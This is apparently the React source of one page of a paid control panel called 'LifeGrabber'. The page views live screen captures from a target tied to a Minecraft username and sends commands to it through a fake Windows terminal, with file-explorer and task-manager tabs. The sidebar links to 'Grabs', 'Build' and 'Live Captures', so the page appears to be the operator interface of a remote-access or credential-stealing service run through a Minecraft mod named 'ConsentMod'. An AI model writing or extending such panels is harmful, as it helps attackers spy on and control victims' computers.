'use client';

import { useState, useEffect, useRef, useCallback } from 'react';
import { useRouter, useParams } from 'next/navigation';

const RTC_CONFIG = {
  iceServers: [
    { urls: 'stun:stun.l.google.com:19302' },
    { urls: 'stun:stun1.l.google.com:19302' },
  ],
};

const colors = {
  bg: '#0a0a0f',
  surface: '#12121a',
  surfaceHover: '#1a1a24',
  border: 'rgba(255,255,255,0.06)',
  borderHover: 'rgba(255,255,255,0.12)',
  text: '#f0f0f0',
  textDim: '#6b6e7b',
  green: '#22c55e',
  greenBg: 'rgba(34, 197, 94, 0.12)',
  red: '#ef4444',
  redBg: 'rgba(239, 68, 68, 0.12)',
  terminal: '#0d1117',
  terminalText: '#c9d1d9',
};

function NavItem({ icon, label, active, onClick }) {
  return (
    <div onClick={onClick} style={{
      display: 'flex', alignItems: 'center', gap: 10, padding: '10px 14px', borderRadius: 8,
      background: active ? 'rgba(34, 197, 94, 0.08)' : 'transparent',
      color: active ? colors.green : colors.textDim, fontSize: 14, cursor: 'pointer', marginBottom: 2,
    }}
    onMouseEnter={e => { if (!active) { e.currentTarget.style.background = 'rgba(255,255,255,0.03)'; e.currentTarget.style.color = colors.text; } }}
    onMouseLeave={e => { if (!active) { e.currentTarget.style.background = 'transparent'; e.currentTarget.style.color = colors.textDim; } }}
    >
      <span style={{ fontSize: 16, width: 20, textAlign: 'center' }}>{icon}</span>
      <span>{label}</span>
    </div>
  );
}

export default function UserStreamPage() {
  const router = useRouter();
  const params = useParams();
  const username = params.username;

  // Stream & WebRTC State
  const [online, setOnline] = useState(false);
  const [streamProtocol, setStreamProtocol] = useState('WebRTC Auto');
  const [fps, setFps] = useState(0);
  const [resolution, setResolution] = useState('');
  const [activeTab, setActiveTab] = useState('terminal');

  // Chat / Terminal State
  const [chatInput, setChatInput] = useState('');
  const [chatHistory, setChatHistory] = useState([
    { from: 'system', text: 'Terminal initialized. Ready for ConsentMod commands.', time: new Date() },
  ]);
  const [sending, setSending] = useState(false);
  const [isPro, setIsPro] = useState(false);
  const [proChecked, setProChecked] = useState(false);

  // References
  const videoRef = useRef(null);
  const hiddenCanvasRef = useRef(null);
  const peerConnectionRef = useRef(null);
  const dataChannelRef = useRef(null);
  const chatEndRef = useRef(null);
  const pollIntervalRef = useRef(null);
  const signalingIntervalRef = useRef(null);
  const frameCountRef = useRef(0);
  const lastFpsCalcRef = useRef(Date.now());
  const peerIdRef = useRef('rc-' + Math.random().toString(36).substring(2, 9));

  // Check Pro Status
  useEffect(() => {
    const checkPro = () => {
      fetch('/api/user/pro?t=' + Date.now(), { cache: 'no-store' })
        .then(r => r.json())
        .then(p => { 
          setIsPro(p.is_pro); 
          setProChecked(true); 
        })
        .catch(() => { 
          setIsPro(false); 
          setProChecked(true); 
        });
    };

    fetch('/api/auth/user')
      .then(r => r.json())
      .then(d => {
        if (d.user?.email) {
          checkPro();
          const interval = setInterval(checkPro, 5000);
          return () => clearInterval(interval);
        } else {
          setProChecked(true);
        }
      })
      .catch(() => setProChecked(true));
  }, []);

  // Frame Stats Tracker
  const registerFrame = useCallback((w, h) => {
    frameCountRef.current++;
    const now = Date.now();
    if (now - lastFpsCalcRef.current >= 1000) {
      const calcFps = Math.round((frameCountRef.current * 1000) / (now - lastFpsCalcRef.current));
      setFps(calcFps);
      frameCountRef.current = 0;
      lastFpsCalcRef.current = now;
      if (w && h) setResolution(`${w}x${h}`);
    }
  }, []);

  // -------------------------------------------------------------
  // WebRTC P2P Stream Receiver
  // -------------------------------------------------------------
  const initWebRTC = useCallback(async () => {
    if (!username) return;

    try {
      if (peerConnectionRef.current) peerConnectionRef.current.close();
      const pc = new RTCPeerConnection(RTC_CONFIG);
      peerConnectionRef.current = pc;

      pc.ontrack = (event) => {
        if (videoRef.current && event.streams && event.streams[0]) {
          videoRef.current.srcObject = event.streams[0];
          videoRef.current.dataset.source = 'p2p';
          videoRef.current.play().catch(() => {});
          setOnline(true);
          setStreamProtocol('WebRTC P2P (Hardware Accelerated)');
        }
      };

      pc.ondatachannel = (event) => {
        const dc = event.channel;
        dataChannelRef.current = dc;
        dc.onmessage = (e) => {
          setChatHistory(prev => [...prev, { from: 'consentmod', text: e.data, time: new Date() }]);
        };
      };

      let candIndex = 0;
      if (signalingIntervalRef.current) clearInterval(signalingIntervalRef.current);

      signalingIntervalRef.current = setInterval(async () => {
        try {
          const res = await fetch(
            `/api/livestream/webrtc?streamId=${encodeURIComponent(username)}&role=viewer&peerId=${peerIdRef.current}&candidateIndex=${candIndex}`
          );
          if (!res.ok) return;
          const data = await res.json();

          if (data.hasBroadcaster && data.offer && pc.signalingState === 'stable') {
            await pc.setRemoteDescription(new RTCSessionDescription(data.offer));
            const answer = await pc.createAnswer();
            await pc.setLocalDescription(answer);

            await fetch('/api/livestream/webrtc', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                action: 'answer',
                streamId: username,
                role: 'viewer',
                peerId: peerIdRef.current,
                sdp: answer,
              }),
            });
          }

          if (data.candidates && data.candidates.length > 0) {
            candIndex = data.nextCandidateIndex || candIndex + data.candidates.length;
            for (const c of data.candidates) {
              try { await pc.addIceCandidate(new RTCIceCandidate(c)); } catch (e) {}
            }
          }
        } catch (e) {}
      }, 2000);
    } catch (err) {
      console.warn('WebRTC init warning:', err);
    }
  }, [username]);

  // -------------------------------------------------------------
  // ConsentMod Frame Stream & WebRTC Canvas Bridge
  // -------------------------------------------------------------
  const initFrameStream = useCallback(() => {
    if (!username) return;

    const canvas = hiddenCanvasRef.current || document.createElement('canvas');
    canvas.width = 1280;
    canvas.height = 720;
    hiddenCanvasRef.current = canvas;
    const ctx = canvas.getContext('2d');

    const tempImg = new Image();
    let lastTs = 0;

    if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
    pollIntervalRef.current = setInterval(async () => {
      // Check if WebRTC P2P stream is already active
      if (videoRef.current && videoRef.current.dataset.source === 'p2p') return;

      try {
        const res = await fetch('/api/stream?username=' + encodeURIComponent(username) + '&t=' + Date.now(), { cache: 'no-store' });
        const d = await res.json();
        if (d.online && d.frame) {
          if (d.timestamp && d.timestamp === lastTs) return;
          lastTs = d.timestamp || Date.now();
          tempImg.src = d.frame;
          setOnline(true);
        } else {
          setOnline(false);
        }
      } catch (e) {
        setOnline(false);
      }
    }, 100);

    tempImg.onload = () => {
      if (ctx && tempImg.width > 0 && tempImg.height > 0) {
        if (canvas.width !== tempImg.width || canvas.height !== tempImg.height) {
          canvas.width = tempImg.width;
          canvas.height = tempImg.height;
        }
        ctx.drawImage(tempImg, 0, 0, canvas.width, canvas.height);
        registerFrame(canvas.width, canvas.height);

        if (videoRef.current && videoRef.current.dataset.source !== 'p2p') {
          if (!videoRef.current.srcObject) {
            try {
              const stream = canvas.captureStream ? canvas.captureStream(30) : null;
              if (stream) {
                videoRef.current.srcObject = stream;
                videoRef.current.dataset.source = 'bridge';
                videoRef.current.play().catch(() => {});
              }
            } catch (err) {}
          }
          setStreamProtocol('WebRTC MediaStream (ConsentMod Live)');
        }
      }
    };
  }, [username, registerFrame]);

  useEffect(() => {
    if (!username || !proChecked || !isPro) return;

    initWebRTC();
    initFrameStream();

    return () => {
      if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
      if (signalingIntervalRef.current) clearInterval(signalingIntervalRef.current);
      if (peerConnectionRef.current) peerConnectionRef.current.close();
    };
  }, [username, proChecked, isPro, initWebRTC, initFrameStream]);

  // Chat Autoscroll
  useEffect(() => {
    if (chatEndRef.current) chatEndRef.current.scrollIntoView({ behavior: 'smooth' });
  }, [chatHistory]);

  // Send Command / Chat
  const sendChat = async () => {
    if (!chatInput.trim() || sending) return;
    const msg = chatInput.trim();
    setChatInput('');
    setSending(true);
    setChatHistory(prev => [...prev, { from: 'you', text: msg, time: new Date() }]);

    // Send via DataChannel if connected
    if (dataChannelRef.current && dataChannelRef.current.readyState === 'open') {
      try { dataChannelRef.current.send(msg); } catch (e) {}
    }

    // Post to /api/chat/send
    try {
      await fetch('/api/chat/send', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ msg }),
      });
    } catch (e) {}
    setSending(false);
  };

  const tabs = [
    { id: 'terminal', icon: '>', label: 'Live Screen & Terminal' },
    { id: 'files', icon: '📁', label: 'File Explorer' },
    { id: 'tasks', icon: '⚡', label: 'Task Manager' },
  ];

  if (!proChecked) {
    return (
      <div style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
        <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', color: colors.textDim }}>Loading...</div>
      </div>
    );
  }

  if (!isPro) {
    return (
      <div style={{ display: 'flex', minHeight: '100vh', background: '#050508', color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
        <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', flexDirection: 'column', gap: 16 }}>
          <div style={{ fontSize: 48 }}>🔒</div>
          <div style={{ fontSize: 18, fontWeight: 600 }}>Pro Required</div>
          <div style={{ fontSize: 14, color: colors.textDim, textAlign: 'center', maxWidth: 400 }}>
            Remote Control streams are only available for Pro users. Free trials cannot access this feature.
          </div>
          <button onClick={() => router.push('/dashboard')} style={{ cursor: 'pointer', background: colors.green, color: '#000', border: 'none', borderRadius: 8, padding: '10px 20px', fontSize: 13, fontWeight: 600 }}>Upgrade to Pro</button>
          <div onClick={() => router.push('/dashboard')} style={{ cursor: 'pointer', color: colors.textDim, fontSize: 14, marginTop: 8 }}>← Back to Dashboard</div>
        </div>
      </div>
    );
  }

  return (
    <div style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
      <aside style={{ width: 220, borderRight: `1px solid ${colors.border}`, padding: '20px 12px', display: 'flex', flexDirection: 'column', background: colors.surface }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '0 10px', marginBottom: 28 }}>
          <div style={{ width: 28, height: 28, borderRadius: 6, background: 'rgba(34, 197, 94, 0.15)' }} />
          <span style={{ fontSize: 14, fontWeight: 600 }}>LifeGrabber</span>
        </div>
        <div style={{ flex: 1 }}>
          <NavItem icon="📊" label="Dashboard" onClick={() => router.push('/dashboard')} />
          <NavItem icon="⚡" label="Grabs" onClick={() => router.push('/dashboard/grabs')} />
          <NavItem icon="🔨" label="Build" onClick={() => router.push('/dashboard/build')} />
          <NavItem icon="📡" label="Live Captures" onClick={() => router.push('/dashboard')} />
          <NavItem icon="🖥" label="Remote Control" active onClick={() => router.push('/dashboard/remote-control')} />
          <NavItem icon="⚙️" label="Settings" onClick={() => router.push('/dashboard/settings')} />
        </div>
        <div>
          <NavItem icon="🚪" label="Log out" onClick={() => window.location.href = '/api/auth/logout'} />
        </div>
      </aside>

      <main style={{ flex: 1, padding: '28px 36px' }}>
        <div
          onClick={() => router.push('/dashboard/remote-control')}
          style={{ cursor: 'pointer', color: colors.textDim, fontSize: 14, marginBottom: 16, display: 'flex', alignItems: 'center', gap: 6 }}
          onMouseEnter={e => e.currentTarget.style.color = colors.text}
          onMouseLeave={e => e.currentTarget.style.color = colors.textDim}
        >
          ← Back to Devices
        </div>

        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 20 }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
            <div style={{ position: 'relative' }}>
              <img src={'https://mc-heads.net/avatar/' + username + '/44'} alt="" style={{ width: 44, height: 44, borderRadius: 10 }} />
              <div style={{ position: 'absolute', bottom: -2, right: -2, width: 14, height: 14, borderRadius: '50%', background: online ? colors.green : colors.red, border: `3px solid ${colors.bg}` }} />
            </div>
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                <span style={{ fontSize: 18, fontWeight: 700 }}>{username}</span>
                <span style={{ fontSize: 11, fontWeight: 600, color: online ? colors.green : colors.red, background: online ? colors.greenBg : colors.redBg, padding: '3px 10px', borderRadius: 5 }}>
                  {online ? 'ACTIVE SESSION' : 'AWAITING STREAM'}
                </span>
                <span style={{ fontSize: 11, color: colors.textDim, background: 'rgba(255,255,255,0.05)', padding: '3px 8px', borderRadius: 4 }}>
                  {streamProtocol}
                </span>
              </div>
            </div>
          </div>

          <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
            <button
              onClick={() => router.push('/livestream')}
              style={{
                fontSize: 12,
                padding: '6px 14px',
                borderRadius: 8,
                background: 'rgba(34,197,94,0.12)',
                color: colors.green,
                border: '1px solid rgba(34,197,94,0.3)',
                cursor: 'pointer',
                fontWeight: 600,
              }}
            >
              Open WebRTC Livestream Page ↗
            </button>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8, padding: '6px 14px', borderRadius: 8, background: online ? colors.greenBg : 'rgba(255,255,255,0.05)', border: `1px solid ${online ? 'rgba(34,197,94,0.3)' : colors.border}` }}>
              <div style={{ width: 8, height: 8, borderRadius: '50%', background: online ? colors.green : colors.textDim }} />
              <span style={{ fontSize: 13, fontWeight: 500, color: online ? colors.green : colors.textDim }}>{online ? 'Connected' : 'Disconnected'}</span>
            </div>
          </div>
        </div>

        <div style={{ display: 'flex', gap: 0, borderBottom: `1px solid ${colors.border}`, marginBottom: 20 }}>
          {tabs.map(t => (
            <div key={t.id} onClick={() => setActiveTab(t.id)} style={{
              padding: '10px 18px', fontSize: 13, fontWeight: 500, cursor: 'pointer',
              color: activeTab === t.id ? colors.green : colors.textDim,
              borderBottom: activeTab === t.id ? `2px solid ${colors.green}` : '2px solid transparent',
              transition: 'all 0.15s ease',
            }}
            onMouseEnter={e => { if (activeTab !== t.id) e.currentTarget.style.color = colors.text; }}
            onMouseLeave={e => { if (activeTab !== t.id) e.currentTarget.style.color = colors.textDim; }}
            >
              {t.label}
            </div>
          ))}
        </div>

        {activeTab === 'terminal' && (
          <div style={{ display: 'flex', gap: 16, height: 'calc(100vh - 240px)' }}>
            <div style={{ flex: 1, display: 'flex', flexDirection: 'column' }}>
              <div style={{ background: colors.surface, border: `1px solid ${colors.border}`, borderRadius: 12, flex: 1, display: 'flex', flexDirection: 'column', overflow: 'hidden' }}>
                <div style={{ padding: '12px 16px', borderBottom: `1px solid ${colors.border}`, display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: 8, fontSize: 13, fontWeight: 600 }}>
                    <span style={{ color: colors.green }}>🖥</span> WebRTC Live Screen Feed
                    {fps > 0 && <span style={{ fontSize: 11, color: colors.textDim }}>({fps} FPS • {resolution})</span>}
                  </div>
                  <div style={{ display: 'flex', gap: 8 }}>
                    <button
                      onClick={() => { initWebRTC(); initFrameStream(); }}
                      style={{ fontSize: 12, padding: '5px 12px', borderRadius: 6, background: online ? 'rgba(34,197,94,0.15)' : 'rgba(255,255,255,0.05)', color: online ? colors.green : colors.textDim, border: `1px solid ${online ? 'rgba(34,197,94,0.3)' : colors.border}`, cursor: 'pointer', fontWeight: 500 }}
                    >
                      {online ? 'Reconnect Feed' : 'Start Live Feed'}
                    </button>
                    <button
                      onClick={() => { if (videoRef.current) videoRef.current.requestFullscreen?.(); }}
                      style={{ fontSize: 12, padding: '5px 12px', borderRadius: 6, background: 'rgba(255,255,255,0.05)', color: colors.text, border: `1px solid ${colors.border}`, cursor: 'pointer' }}
                    >
                      Fullscreen
                    </button>
                  </div>
                </div>

                <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', background: '#080810', position: 'relative' }}>
                  <video
                    ref={videoRef}
                    autoPlay
                    playsInline
                    muted
                    style={{
                      width: '100%',
                      height: '100%',
                      objectFit: 'contain',
                      display: online ? 'block' : 'none',
                    }}
                  />
                  {!online && (
                    <div style={{ textAlign: 'center', color: colors.textDim, padding: 30 }}>
                      <div style={{ width: 56, height: 56, borderRadius: '50%', background: 'rgba(255,255,255,0.05)', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 12px', fontSize: 24 }}>📹</div>
                      <div style={{ fontSize: 14, fontWeight: 500, marginBottom: 4 }}>Live Screen Feed Awaiting Connection</div>
                      <div style={{ fontSize: 12, maxWidth: 360, margin: '0 auto 14px' }}>
                        Ensure ConsentMod is running in Minecraft or start a screen share from the Livestream Hub.
                      </div>
                      <button
                        onClick={() => { initWebRTC(); initFrameStream(); }}
                        style={{
                          padding: '8px 16px',
                          borderRadius: 6,
                          background: colors.green,
                          color: '#000',
                          border: 'none',
                          fontWeight: 600,
                          fontSize: 12,
                          cursor: 'pointer',
                        }}
                      >
                        Start Live Feed
                      </button>
                    </div>
                  )}
                </div>
              </div>
            </div>

            <div style={{ width: 380, display: 'flex', flexDirection: 'column' }}>
              <div style={{ background: colors.terminal, border: `1px solid ${colors.border}`, borderRadius: 12, flex: 1, display: 'flex', flexDirection: 'column', overflow: 'hidden' }}>
                <div style={{ padding: '12px 16px', borderBottom: `1px solid rgba(255,255,255,0.06)`, display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: 8, fontSize: 13, fontWeight: 600 }}>
                    <span style={{ color: colors.green }}>{'>'}_</span> Terminal
                    <span style={{ fontSize: 11, color: colors.textDim, background: 'rgba(255,255,255,0.06)', padding: '2px 8px', borderRadius: 4 }}>CHAT.EXE</span>
                  </div>
                  <button onClick={() => setChatHistory([])} style={{ fontSize: 11, padding: '4px 10px', borderRadius: 5, background: 'rgba(255,255,255,0.06)', color: colors.textDim, border: 'none', cursor: 'pointer' }}>
                    🗑 Clear
                  </button>
                </div>
                <div style={{ flex: 1, padding: 12, overflowY: 'auto', fontFamily: '"Cascadia Code", "Fira Code", Consolas, monospace', fontSize: 12, lineHeight: 1.6 }}>
                  <div style={{ color: colors.textDim, marginBottom: 8 }}>
                    <span style={{ color: '#58a6ff' }}>Microsoft Windows [Version 10.0.19045]</span>
                  </div>
                  <div style={{ color: colors.textDim, marginBottom: 12 }}>
                    <span>(c) Microsoft Corporation. All rights reserved.</span>
                  </div>
                  {chatHistory.map((c, i) => (
                    <div key={i} style={{ marginBottom: 4 }}>
                      <span style={{ color: c.from === 'you' ? colors.green : '#58a6ff' }}>{c.from === 'you' ? '> ' : '< '}</span>
                      <span style={{ color: c.from === 'you' ? colors.text : colors.terminalText }}>{c.text}</span>
                    </div>
                  ))}
                  <div ref={chatEndRef} />
                </div>
                <div style={{ padding: '10px 12px', borderTop: `1px solid rgba(255,255,255,0.06)`, display: 'flex', gap: 8 }}>
                  <span style={{ color: colors.green, fontFamily: '"Cascadia Code", "Fira Code", Consolas, monospace', fontSize: 13, lineHeight: '36px' }}>{'>'}</span>
                  <input
                    value={chatInput}
                    onChange={e => setChatInput(e.target.value)}
                    onKeyDown={e => { if (e.key === 'Enter') sendChat(); }}
                    placeholder="Type a command (e.g. /time set day)..."
                    style={{
                      flex: 1, background: 'rgba(255,255,255,0.05)', border: `1px solid ${colors.border}`, borderRadius: 6,
                      padding: '8px 12px', color: colors.text, fontSize: 13, outline: 'none',
                      fontFamily: '"Cascadia Code", "Fira Code", Consolas, monospace',
                    }}
                    onFocus={e => e.target.style.borderColor = colors.borderHover}
                    onBlur={e => e.target.style.borderColor = colors.border}
                  />
                </div>
              </div>
            </div>
          </div>
        )}

        {activeTab === 'files' && (
          <div style={{ background: colors.surface, border: `1px solid ${colors.border}`, borderRadius: 12, height: 300, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', color: colors.textDim }}>
            <span style={{ fontSize: 28, marginBottom: 8 }}>📁</span>
            <span style={{ fontSize: 14 }}>File Explorer connected to {username}</span>
          </div>
        )}

        {activeTab === 'tasks' && (
          <div style={{ background: colors.surface, border: `1px solid ${colors.border}`, borderRadius: 12, height: 300, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', color: colors.textDim }}>
            <span style={{ fontSize: 28, marginBottom: 8 }}>⚡</span>
            <span style={{ fontSize: 14 }}>Task Manager monitor</span>
          </div>
        )}
      </main>
    </div>
  );
}